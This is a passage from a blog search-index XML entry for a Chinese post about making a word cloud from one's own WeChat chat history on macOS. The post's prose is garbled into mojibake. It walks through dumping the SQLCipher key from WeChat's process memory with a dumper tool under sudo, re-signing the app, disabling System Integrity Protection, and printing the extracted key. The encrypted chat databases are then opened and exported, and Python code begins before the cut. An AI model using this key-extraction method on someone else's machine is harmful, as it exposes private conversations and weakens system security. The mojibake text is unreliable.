<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pythonå¤„ç†å¾®ä¿¡èŠå¤©è®°å½•</title>
      <link href="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#python%E5%A4%84%E7%90%86%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95">Pythonå¤„ç†èŠå¤©è®°å½•</a><ul><li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">å‡†å¤‡å·¥ä½œ</a></li><li><a href="#%E5%BC%80%E5%A7%8B%E7%A0%B4%E8%A7%A3%E5%AF%86%E9%92%A5">å¼€å§‹ç ´è§£å¯†é’¥</a></li><li><a href="#%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE">æå–æ•°æ®</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86">æ•°æ®å¤„ç†</a><ul><li><a href="#%E7%94%9F%E6%88%90%E8%AF%8D%E4%BA%91%E5%9B%BE">ç”Ÿæˆè¯äº‘å›¾</a></li><li><a href="#%E8%A1%A8%E6%83%85%E5%8C%85%E7%BB%9F%E8%AE%A1">è¡¨æƒ…åŒ…ç»Ÿè®¡</a></li><li><a href="#%E6%97%B6%E9%97%B4%E5%88%86%E6%AE%B5%E8%81%8A%E5%A4%A9%E9%A2%91%E7%8E%87%E5%88%86%E6%9E%90">æ—¶é—´åˆ†æ®µèŠå¤©é¢‘ç‡åˆ†æ</a></li></ul></li><li><a href="#%E8%81%8A%E5%A4%A9%E9%A2%91%E7%8E%87%E7%83%AD%E5%9B%BE%E5%88%86%E6%9E%90">èŠå¤©é¢‘ç‡çƒ­å›¾åˆ†æ</a></li></ul></li></ul><!-- tocstop --><h1><span id="pythonå¤„ç†èŠå¤©è®°å½•">Pythonå¤„ç†èŠå¤©è®°å½•</span></h1><h2><span id="å‰è¨€">å‰è¨€</span></h2><p>ç»ˆäºå¿«åˆ°999çºªå¿µæ—¥äº†ï¼Œæœ¬æ¥æƒ³ç»™å®ä¹°å°æ‰‹æœºï¼Œå¯æ˜¯å®è¯´ç±³æœ‰çºªå¿µæ„ä¹‰ã€‚æœ€è¿‘åˆ·åˆ°ä¸€å¯¹å¥½çœ‹çš„ğŸ’ï¼Œä½†æ˜¯å®ƒåº—é“ºå…³é—¨å¤§å‰äº†ï¼Œåªèƒ½ä½œç½¢ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022111911128.png" alt="æˆ’æŒ‡"></p><p>æœ‰æ„ä¹‰ï¼Œæœ‰æ„ä¹‰ï¼Œä»€ä¹ˆä¸œè¥¿æ‰æœ‰æ„ä¹‰å‘¢ï¼Œåˆæ˜¯æˆ‘èƒ½äº²æ‰‹å®ç°çš„ä¸œè¥¿ï¼Œåšä¸»çµæœºä¸€åŠ¨ï¼ŒèŠå¤©è®°å½•æ˜¯æ‰¿è½½ä¸¤ä¸ªäººæƒ…æ„Ÿçš„é‡è¦æ¡¥æ¢ï¼Œå› æ­¤æˆ‘åªéœ€è¦å¯¹èŠå¤©è®°å½•è¿›è¡Œå¤„ç†ï¼Œç”Ÿæˆä¸“å±äºæˆ‘ä»¬ä¸¤ä¸ªäººçš„è¯äº‘å›¾ä¸å°±å¯ä»¥äº†ä¹ˆï¼ï¼ï¼ˆåšä¸»çš„æ‰£æ‰£èŠå¤©è®°å½•ä¹Ÿä¸€ç›´ä¿å­˜åˆ°ç°åœ¨å“¦ hiahiaï¼‰</p><h2><span id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</span></h2><p>æŸ¥äº†å¾ˆå¤šæŠ€æœ¯è·¯çº¿å’Œç›¸å…³èµ„æ–™ï¼Œå‘ç°å¾®ä¿¡æ˜¯ç”¨<em>SQLite</em>æ•°æ®åº“ä¿å­˜èŠå¤©è®°å½•çš„ï¼ŒåŒæ—¶ä½¿ç”¨SQLCipherå°è£…äº†è‡ªå·±çš„<a href="https://sspai.com/link?target=https://github.com/Tencent/wcdb">WCDB</a> æ•°æ®åº“æ¡†æ¶ï¼Œå› æ­¤åªæœ‰è·å–æ•°æ®åº“çš„å¯†é’¥æ‰èƒ½è·å–åˆ°èŠå¤©è®°å½•ï¼Œç„¶åæ‰èƒ½è¿›è¡Œæ•°æ®å¤„ç†ã€‚</p><p>é€šè¿‡é˜…è¯»ç™¾çµé¸Ÿå®‰å…¨å›¢é˜Ÿå‘å¸ƒçš„æ–‡ç« ã€Œ<a href="https://mp.weixin.qq.com/s?__biz=MzU0NzczMDg4Mg==&mid=2247483863&idx=1&sn=ae6d1069a517e0176822efad9835dbd3&chksm=fb48a57acc3f2c6c412cf96a1dececc42ec8853931386f0988b404c9df92b0d2f3d9ee8f5491&mpshare=1&scene=1&srcid=0818f2cWp0w1sgFkUmhGL4Oe&sharer_sharetime=1692294905463&sharer_shareid=92340da57488f8262c6c5e5b5e83ac2b#rd">æ‰“é€  macOS ä¸‹æœ€å¼ºçš„å¾®ä¿¡å–è¯å·¥å…·</a>ã€ï¼Œäº†è§£åˆ°äº†<a href="https://github.com/kekeimiku/PointerSearcher-X/releases/tag/v0.4.1">å¾®ä¿¡å¯†é’¥æå–</a>çš„ä»“åº“ï¼Œä¸‹è½½æœ€æ–°çš„releaseï¼Œç„¶åæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å¾®ä¿¡çš„ç‰ˆæœ¬å·ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022115130876-7946694.png" alt="å¾®ä¿¡ç‰ˆæœ¬å·"></p><p>ç„¶åè®¿é—®<a href="https://github.com/kekeimiku/dumpkey">dumpkeyé¦–é¡µ</a>æ‰¾åˆ°æˆ‘ä»¬çš„å¾®ä¿¡æ‰€å¯¹åº”çš„æ“ä½œå‘½ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./dumper <span class="built_in">test</span> --pid $(pgrep WeChat |<span class="built_in">head</span> -1) --path <span class="string">&quot;WeChat+81059936@8@8@16@32@8@8@64@8@0@0&quot;</span> -n 32</span><br></pre></td></tr></table></figure><h2><span id="å¼€å§‹ç ´è§£å¯†é’¥">å¼€å§‹ç ´è§£å¯†é’¥</span></h2><p>é€šè¿‡è¾“å…¥åˆšåˆšæŸ¥è¯¢çš„ä»£ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥è§£å¯†å¯†é’¥äº†ã€‚</p><p>å•Šå“¦ï¼Œå‡ºç°äº†é”™è¯¯</p><p><code>error: OpenProcess, (os/kern) failure. code: 5</code></p><p>æ ¹æ®æç¤ºè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo codesign --sign - --force --deep /Applications/WeChat.app</span><br></pre></td></tr></table></figure><p>æ€ä¹ˆè¿˜æ˜¯ä¸è¡Œï¼Œè¯•è¯•çœ‹å…³é—­SIPã€‚</p><p> å…³æœºï¼Œç„¶åé‡æ–°å¯åŠ¨ä½ çš„Macç”µè„‘ï¼Œåœ¨å¼€æœºæ—¶ä¸€ç›´æŒ‰ä½Command+Rè¿¸å…¥Recoveryæ¨¡å¼ã€‚M1çš„ç”µè„‘å¯ä»¥è¯•è¯•çœ‹é•¿æŒ‰ç”µæºé”®ï¼Œç„¶åç‚¹å‡»é€‰é¡¹ï¼Œè¾“å…¥å¯†ç ååœ¨å®ç”¨å·¥å…·é‡Œé¢ç‚¹å‡»ç»ˆç«¯ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/dfff50243cd94b0527e5f125c35c17c3.jpg" alt="æ¢å¤æ¨¡å¼"></p><p>åœ¨ç»ˆç«¯ä¸Šè¾“å…¥å‘½ä»¤ csrutil disableç„¶åå›è½¦ï¼Œç„¶åè¾“å…¥rebooté‡å¯å³å¯ã€‚</p><p>ç„¶åå†æ“ä½œä¸€éæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¯†é’¥</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022120804368.png" alt="å¯†é’¥"></p><p>å› ä¸ºæ˜¯16è¿›åˆ¶ï¼Œå› æ­¤éœ€è¦åœ¨å‰é¢åŠ ä¸Š0xå³</p><p><code>0x1B89B26FF2FD482E987ADD77DC4BC263D6FFA2781436466589AFCA80AAA8E6A3</code></p><p>é“›é“›é“›~é“›ï¼ï¼æˆ‘ä»¬å¾—åˆ°äº†<em>SQLite</em>çš„å¯†é’¥</p><h2><span id="æå–æ•°æ®">æå–æ•°æ®</span></h2><p>ç„¶åéšä¾¿åœ¨å¾®ä¿¡é‡Œé¢æ‰¾ä¸€å¼ å›¾ï¼Œåœ¨finderä¸­æ˜¾ç¤ºï¼Œ</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022155319319.png" alt="èŠå¤©è®°å½•"></p><p>åœ¨æ‰“å¼€çš„ Finder ä¸­ï¼Œå‘å¤–å›é€€ä¸¤å±‚ç›®å½•ï¼Œæ‰€æœ‰çš„ <code>msg_æ•°å­—.db</code> é‡Œé¢å­˜å‚¨çš„éƒ½æ˜¯èŠå¤©è®°å½•ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022155424360.png" alt="finderç›®å½•"></p><p>ä¸ºäº†èƒ½å¤Ÿæ‰“å¼€æ•°æ®åº“æ–‡ä»¶è¿›è¡Œå¯¼å‡ºæ“ä½œï¼Œéœ€è¦ä¸‹è½½ <a href="https://sspai.com/link?target=https://sqlitebrowser.org/dl/">DB Browser for SQLite </a>è¿›è¡Œæ“ä½œã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ï¼Œæˆ‘ä»¬æœ€å¥½å…³é—­å¾®ä¿¡è¿›è¡Œæ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨ä¸Šå›¾æ–‡ä»¶å¤¹ä¸­æ‰“å¼€ç»ˆç«¯</span></span><br><span class="line"><span class="built_in">cp</span> msg*.db ~/Desktop/Proj/wechat</span><br><span class="line"><span class="comment"># å»ºç«‹db0-db9</span></span><br><span class="line"><span class="built_in">mkdir</span> db&#123;0..9&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022164528102.png" alt="å»ºç«‹æ–‡ä»¶å¤¹"></p><p>ç„¶åä½¿ç”¨ DB Browser for SQLite ä»»æ„æ‰“å¼€ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œæ­¤å¤„æœ‰ä¸‰ä¸ªæ³¨æ„ç‚¹ï¼š</p><ol><li><p>å¯†ç ç±»å‹ï¼šé€‰æ‹©ã€ŒåŸå§‹å¯†é’¥ã€</p></li><li><p>å¯†ç ï¼Œç¬¬ä¸€ç§ä½¿ç”¨ ptrsx-dumper è·å–åˆ°çš„å¯†ç å‰é¢æ²¡æœ‰ <code>0x</code> å­—ç¬¦ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨åŠ ä¸Šï¼Œç¬¬äºŒç§ Python è§£æå‡ºæ¥çš„å¯†ç å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚æ­¤å¤„æˆ‘å¡«å†™çš„å¯†ç å°±æ˜¯ï¼š<code>0x1B89B26FF2FD482E987ADD77DC4BC263D6FFA2781436466589AFCA80AAA8E6A3</code></p></li><li><p>åŠ å¯†è®¾ç½®ï¼šé€‰æ‹©ã€ŒSQLCipher 3 é»˜è®¤ã€</p></li></ol><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165111418.png" alt="æ•°æ®åº“è¿æ¥"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥è¿›å…¥æ•°æ®åº“äº†ï¼ï¼</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165130579.png" alt="æ•°æ®åº“å±•ç¤º"></p><p>åˆ‡æ¢åˆ°ã€Œæµè§ˆæ•°æ®ã€é€‰é¡¹ï¼Œé€šè¿‡é€‰æ‹©ä¸åŒè¡¨å°±å¯ä»¥æŸ¥çœ‹å’Œä¸åŒå¥½å‹ä¹‹é—´çš„èŠå¤©è®°å½•ï¼Œå¦‚ä¸‹æ‰€ç¤ºå°±æ˜¯ä¸€ä»½èŠå¤©è®°å½•ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165205053.png" alt="èŠå¤©è®°å½•"></p><p>ä¸‹ä¸€æ­¥æˆ‘ä»¬å°±å¯ä»¥å°†æ•°æ®å¯¼å‡ºäº†ï¼Œæ¯ä¸ªdbå¯¹åº”æ¯ä¸ªæ–‡ä»¶å¤¹ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165414973.png" alt="å¯¼å‡ºè®°å½•"></p><p>å¯¼å‡ºåæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œå•¦ï¼ï¼</p><h2><span id="æ•°æ®å¤„ç†">æ•°æ®å¤„ç†</span></h2><p>æœ‰äº†æˆ‘ä»¬çš„jsonæ•°æ®å°±å¯ä»¥åˆ¶ä½œè¯äº‘äº†ã€‚</p><p>éœ€è¦çš„åº“å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install wordcloud matplotlib pandas jieba mplfonts imageio openpyxl numpy</span><br></pre></td></tr></table></figure><p>æœ‰äº†æ‰€æœ‰çš„èŠå¤©è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¼åˆ¶ä½œè¯äº‘äº†ï¼Œå…ˆäº†è§£ä¸€ä¸‹å¯¼å‡ºJsonæ•°æ®çš„ç»“æ„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;CompressContent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ConBlob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chN3eGlkX3k2OHh0MDk4NHFjczIxeglsaXV6b25nZGGAAQCYAQCgAQC4AQDIAQDQAQDwAQD4AQCIAgI=&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IntRes1&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IntRes2&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;StrRes1&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;StrRes2&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mesDes&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mesLocalID&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mesSvrID&quot;</span><span class="punctuation">:</span> <span class="number">9004976427286855000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;messageType&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgContent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello world&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgCreateTime&quot;</span><span class="punctuation">:</span> <span class="number">1611106801</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgImgStatus&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgSeq&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgStatus&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgVoiceText&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ¯”è¾ƒå€¼å¾—å…³æ³¨çš„å­—æ®µå¦‚ä¸‹ï¼š</p><ul><li>msgContentï¼šæ¶ˆæ¯å†…å®¹</li><li>msgCreateTimeï¼šæ¶ˆæ¯åˆ›å»ºæ—¶é—´ï¼Œä½¿ç”¨ Unix Time è¡¨ç¤º</li><li>messageTypeï¼šæ¶ˆæ¯ç±»å‹<ul><li>æ–‡æœ¬ï¼š1</li><li>å›¾ç‰‡ï¼š3</li><li>è¯­éŸ³ï¼š34</li><li>è§†é¢‘ï¼š43</li><li>è¡¨æƒ…åŒ…ï¼š47</li><li>ä½ç½®ï¼š48</li><li>åˆ†äº«æ¶ˆæ¯ï¼š49</li><li>ç³»ç»Ÿæ¶ˆæ¯ï¼š10000</li></ul></li><li>msgStatusï¼šæ¶ˆæ¯çŠ¶æ€<ul><li>æ”¶åˆ°æ¶ˆæ¯ï¼š4</li><li>å‘å‡ºæ¶ˆæ¯ï¼š2ã€3</li></ul></li><li>msgVoiceTextï¼šå¾®ä¿¡çš„è¯­éŸ³è½¬æ–‡å­—è¯†åˆ«ç»“æœ</li></ul><p>å‰ç½®çŸ¥è¯†æœ‰äº†ï¼Œå°±å¯ä»¥å¼€å§‹åŠ¨æ‰‹å†™ä»£ç äº†ã€‚åˆ¶ä½œè¯äº‘å›¾ç‰‡ï¼Œåªéœ€è¦æå–å‡ºæ‰€æœ‰ messageType ç­‰äº 1 çš„è®°å½•ï¼Œå¹¶æŠŠè¿™äº›èŠå¤©è®°å½•è¿›è¡Œåˆ†è¯ä¹‹åï¼Œå°±å¯ä»¥åˆ¶ä½œè¯äº‘äº†ã€‚</p><p>é‚£ä¹ˆæ–°çš„é—®é¢˜æ¥äº†ï¼Œå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°é‚£ä¸ªå¥½å‹&#x2F;ç¾¤èŠå¯¹åº”çš„ JSON æ–‡ä»¶ï¼Ÿä½¿ç”¨ grep å‘½ä»¤å³å¯ã€‚æ‰¾åˆ°æƒ³è¦ç”Ÿæˆè¯äº‘çš„ç¾¤èŠï¼Œä»»æ„é€‰æ‹©ä¸€å¥èŠå¤©è®°å½•ï¼Œåªè¦å’Œåˆ«çš„ç¾¤æœ‰ä¸€å®šåŒºåˆ†åº¦å³å¯ã€‚ä¾‹å¦‚ï¼š</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022172215934.png" alt="èŠå¤©è®°å½•"></p><p>ä½¿ç”¨grepå‘½ä»¤æŸ¥è¯¢</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022172326028.png" alt="grep"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„è·¯å¾„</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022172418945.png" alt="æ–‡ä»¶è·¯å¾„"></p><h3><span id="ç”Ÿæˆè¯äº‘å›¾">ç”Ÿæˆè¯äº‘å›¾</span></h3><p>æˆ‘ä»¬å…ˆå†™ä¸ªä»£ç å¤„ç†ä¸€ä¸‹è¯äº‘å›¾ã€‚</p><ol><li><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦èƒ½å¤Ÿè¯»å–èŠå¤©è®°å½•é‡Œçš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨jsonæ¥è¯»å–ã€‚</p></li><li><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬éœ€è¦æŠŠèŠå¤©è®°å½•é‡Œé¢çš„å¥å­åˆ‡å‰²æˆå„ä¸ªå•è¯ï¼Œè¿˜éœ€è¦å‰”é™¤æ²¡æœ‰æ„ä¹‰çš„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼šå•Šã€å§ã€å‘¢å’Œå—ç­‰ç­‰ç­‰ã€‚åŒæ—¶è¿˜éœ€è¦å±è”½æ‰å¾®ä¿¡çš„è¡¨æƒ…åŒ…ï¼Œå¾®ä¿¡çš„è¡¨æƒ…åŒ…æœ‰å°†è¿‘ 50 ä¸ªé»˜è®¤è¡¨æƒ…åŒ…ï¼Œè‡ªå·±ä¸€ä¸ªä¸ªå»ç»Ÿè®¡å²‚ä¸æ˜¯å¤ªéº»çƒ¦äº†ï¼Ÿç®€å•ç²—æš´ä¸€ç‚¹çš„åŠæ³•å°±æ˜¯ç›´æ¥ä¸Šï¼ŒæŠŠå¾®ä¿¡é»˜è®¤çš„è¡¨æƒ…éƒ½æŒ‰ä¸€éè¿‡å»ã€‚å‘ç»™è‡ªå·±ï¼Œç„¶åæ‹·è´å‡ºæ¥ã€‚ä½¿ç”¨ sed å‘½ä»¤å¤„ç†ä¸€ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p><p><code>pbpaste|sed &quot;s|\]\[|&#39;,&#39;|g ; s|\[|\[&#39;| ; s|\]|&#39;\]|&quot;</code></p><p>ä¹Ÿå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åšã€‚</p></li><li><p>ä¸ºäº†ç¾è§‚ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è®¾ç½®èƒŒæ™¯å›¾ç‰‡ï¼Œé€šè¿‡<code>mask</code>å‚æ•°è®¾ç½®</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># å¼•å…¥ç»“å·´åˆ†è¯ï¼Œå¯¹ç¾¤èŠè®°å½•è¿›è¡Œåˆ†è¯</span></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="comment"># å¼•å…¥è¯äº‘</span></span><br><span class="line"><span class="keyword">import</span> wordcloud</span><br><span class="line"><span class="comment"># å¼•å…¥åœæ­¢è¯æ¨¡å—</span></span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud, STOPWORDS</span><br><span class="line"><span class="comment"># å¼•å…¥ imageio è¯»å–çˆ±å¿ƒå›¾ç‰‡æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">from</span> imageio.v2 <span class="keyword">import</span> imread</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;/Users/disda/Desktop/Proj/wechat/db5/Chat_f611156ea3b00eb663747961911867d4.json&#x27;</span>).read()</span><br><span class="line">data = json.loads(data)</span><br><span class="line"></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> (item[<span class="string">&#x27;messageType&#x27;</span>] == <span class="number">1</span>):</span><br><span class="line">        message = item[<span class="string">&#x27;msgContent&#x27;</span>].split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        content += message[<span class="number">0</span>] + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">ls = jieba.lcut(content)</span><br><span class="line"><span class="comment"># å¦‚æœåˆ†è¯å‡ºæ¥åªæœ‰ä¸€ä¸ªå­—ç¬¦å‰”é™¤è¿™ä¸ªå­—ç¬¦</span></span><br><span class="line">ls = [i <span class="keyword">for</span> i <span class="keyword">in</span> ls <span class="keyword">if</span> <span class="built_in">len</span>(i) &gt; <span class="number">1</span>]</span><br><span class="line">text = <span class="string">&#x27; &#x27;</span>.join(ls)</span><br><span class="line"></span><br><span class="line">stopwords = STOPWORDS</span><br><span class="line"><span class="comment"># æ·»åŠ æ–°çš„åœæ­¢è¯</span></span><br><span class="line">stopwords.update(</span><br><span class="line">    [<span class="string">&#x27;å¾®ç¬‘&#x27;</span>, <span class="string">&#x27;æ’‡å˜´&#x27;</span>, <span class="string">&#x27;è‰²&#x27;</span>, <span class="string">&#x27;å‘å‘†&#x27;</span>, <span class="string">&#x27;å¾—æ„&#x27;</span>, <span class="string">&#x27;æµæ³ª&#x27;</span>, <span class="string">&#x27;å®³ç¾&#x27;</span>, <span class="string">&#x27;é—­å˜´&#x27;</span>, <span class="string">&#x27;ç¡&#x27;</span>, <span class="string">&#x27;å¤§å“­&#x27;</span>, <span class="string">&#x27;å°´å°¬&#x27;</span>, <span class="string">&#x27;å‘æ€’&#x27;</span>, <span class="string">&#x27;è°ƒçš®&#x27;</span>, <span class="string">&#x27;å‘²ç‰™&#x27;</span>, <span class="string">&#x27;æƒŠè®¶&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;éš¾è¿‡&#x27;</span>, <span class="string">&#x27;å›§&#x27;</span>, <span class="string">&#x27;æŠ“ç‹‚&#x27;</span>, <span class="string">&#x27;å&#x27;</span>, <span class="string">&#x27;å·ç¬‘&#x27;</span>, <span class="string">&#x27;æ„‰å¿«&#x27;</span>, <span class="string">&#x27;ç™½çœ¼&#x27;</span>, <span class="string">&#x27;å‚²æ…¢&#x27;</span>, <span class="string">&#x27;å›°&#x27;</span>, <span class="string">&#x27;æƒŠæ&#x27;</span>, <span class="string">&#x27;æ†¨ç¬‘&#x27;</span>, <span class="string">&#x27;æ‚ é—²&#x27;</span>, <span class="string">&#x27;å’’éª‚&#x27;</span>, <span class="string">&#x27;ç–‘é—®&#x27;</span>, <span class="string">&#x27;å˜˜&#x27;</span>,</span><br><span class="line">     <span 